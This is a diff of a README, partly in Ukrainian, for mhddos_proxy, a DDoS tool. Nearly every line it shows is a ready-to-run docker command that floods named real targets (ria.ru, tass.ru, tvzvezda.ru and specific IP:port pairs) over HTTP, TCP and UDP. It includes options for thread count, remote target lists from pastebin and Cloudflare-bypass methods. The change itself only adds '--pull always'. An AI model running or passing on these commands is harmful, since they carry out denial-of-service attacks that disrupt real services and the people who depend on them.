@@ -67,19 +67,19 @@ https://github.com/localdotcom/mhddos-proxy-helm
 
 HTTP(S) по URL
 
-    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://ria.ru https://tass.ru
+    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://ria.ru https://tass.ru
 
 HTTP по IP + PORT
 
-    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy 5.188.56.124:80 5.188.56.124:3606
+    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy 5.188.56.124:80 5.188.56.124:3606
 
 TCP
 
-    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy tcp://194.54.14.131:4477 tcp://194.54.14.131:22
+    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy tcp://194.54.14.131:4477 tcp://194.54.14.131:22
 
 UDP - **ТУТ ПОТРІБНО ВКЛЮЧИТИ VPN**
 
-    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy udp://217.175.155.100:53
+    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy udp://217.175.155.100:53
 
 ### Python - усе аналогічно
 
@@ -91,25 +91,25 @@ UDP - **ТУТ ПОТРІБНО ВКЛЮЧИТИ VPN**
 
 Змінити навантаження - `-t XXXX` - кількість потоків, за замовчуванням - CPU * 1000
 
-    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 3000 https://ria.ru https://tass.ru
+    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 3000 https://ria.ru https://tass.ru
 
 Щоб переглянути інформацію про хід атаки, додайте прапорець `--debug`
 
-    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --debug https://ria.ru https://tass.ru
+    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --debug https://ria.ru https://tass.ru
 
 Змінити частоту оновлення проксі (за замовчуванням - кожні 15 хвилин) - `-p SECONDS`
 
-    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -p 1200 https://ria.ru https://tass.ru
+    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -p 1200 https://ria.ru https://tass.ru
 
 Цілі з віддаленого файла конфігурації - `-c https://pastebin.com/raw/95D1jjzy`
 
-    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -c https://pastebin.com/raw/95D1jjzy
+    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -c https://pastebin.com/raw/95D1jjzy
 
 Обрати метод(и) для HTTP(S) атаки (наприклад для обходу Cloudflare) - `--http-methods CFB`  
 **Цей параметр тільки в кінці** команди  
 Повний список [див. тут](https://github.com/MHProDev/MHDDoS#features-and-methods), окрім DGB, BOMB та KILLER.
 
-    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://ria.ru https://tass.ru --http-methods CFB
+    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://ria.ru https://tass.ru --http-methods CFB
 
 ## Документація
 
@@ -181,7 +181,7 @@ Note that **python** is used instead of python3.
 
 ### Docker
 
-    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest COMMAND
+    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest COMMAND
 
 ### Python
 
@@ -215,7 +215,7 @@ Note that **python** is used instead of python3.
 
     python3 runner.py https://tvzvezda.ru 5.188.56.124:9000 tcp://194.54.14.131:4477 udp://217.175.155.100:53
 
-    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://tvzvezda.ru 5.188.56.124:9000 tcp://194.54.14.131:4477 udp://217.175.155.100:53
+    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://tvzvezda.ru 5.188.56.124:9000 tcp://194.54.14.131:4477 udp://217.175.155.100:53
 
 Target specification
 
